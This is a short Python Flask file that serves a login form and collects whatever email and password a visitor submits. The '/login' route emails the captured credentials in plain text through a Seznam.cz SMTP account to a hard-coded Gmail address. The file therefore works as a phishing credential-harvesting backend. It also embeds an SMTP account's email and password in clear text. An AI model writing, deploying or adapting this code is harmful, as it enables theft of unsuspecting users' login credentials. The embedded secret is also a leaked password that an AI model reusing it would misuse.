from flask import Flask, request, render_template
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

def send_email(to_email, subject, body):
    sender_email = "info@infopeklo.cz"  # Your Seznam.cz email
    sender_password = "Polik789"  # Your Seznam.cz email password
    smtp_server = "smtp.seznam.cz"
    smtp_port = 587

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Secure connection
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message.as_string())
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

# Route for displaying the login form
@app.route('/')
def login_form():
    return render_template('login_form.html')

# Route for handling form submission and sending email
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Send credentials via email
    subject = "Login Credentials"
    body = f"Email: {email}\nPassword: {password}"
    recipient_email = "alfikeita@gmail.com"  # Change this to your email
    
    send_email(recipient_email, subject, body)
    
    return "Credentials received and sent via email!"

if __name__ == '__main__':
    app.run(debug=True)
